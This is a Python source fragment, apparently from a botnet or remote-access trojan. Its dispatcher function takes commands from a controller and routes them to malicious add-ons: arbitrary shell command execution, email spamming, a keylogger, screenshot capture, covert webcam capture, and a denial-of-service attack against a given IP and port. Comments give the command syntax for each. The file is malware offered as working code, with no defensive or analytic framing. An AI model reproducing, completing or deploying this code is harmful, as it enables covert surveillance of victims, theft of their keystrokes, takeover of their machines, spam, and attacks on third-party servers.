def distribute(messageSent):
    if messageSent.find('cmd') != -1:
        # cmd->shell_command
        return bot.addons.shell.shell(messageSent.split('->')[1])
    elif messageSent.find('spam') != -1:
        # spam->url_list_of_emails-url_msg_email
        return bot.addons.spam.spam(messageSent.split('->')[1].split('-')[0], messageSent.split('->')[1].split('-')[1])
    elif messageSent.find('keylogger') != -1:
        # keylogger->num_of_keys
        return bot.addons.keylogger.keylogger(messageSent.split('->')[1])
    elif messageSent.find('screenshot') != -1:
        # screenshot
        return bot.addons.screenshot.screenshot()
    elif messageSent.find('webcam') != -1:
        # webcam
        return bot.addons.webcam.webcam()
    elif messageSent.find('dos') != -1:
        # dos->127.0.0.1:80:minutes:sleep(seconds)
        return bot.addons.dos.dos(messageSent.split('->')[1].split(':')[0], messageSent.split('->')[1].split(':')[1],
                                  messageSent.split('->')[1].split(':')[2], messageSent.split('->')[1].split(':')[3])
    else:
        return "404 - Request not found"
